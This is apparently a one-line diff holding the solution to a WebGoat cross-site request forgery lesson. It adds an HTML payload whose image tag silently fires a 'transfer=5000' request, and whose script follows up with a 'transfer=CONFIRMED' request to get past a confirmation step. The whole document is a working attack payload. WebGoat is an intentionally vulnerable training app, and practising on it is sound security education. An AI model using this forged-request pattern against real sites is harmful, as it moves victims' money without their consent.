@@ -1,0 +1,1 @@
+<img src="/WebGoat/attack?Screen=480054912&menu=900&transfer=5000" id="loaded"/><script>document.getElementById("loaded").addEventListener('error', (event)=>{event.target.src="/WebGoat/attack?Screen=480054912&menu=900&transfer=CONFIRMED";},{once: true});</script>
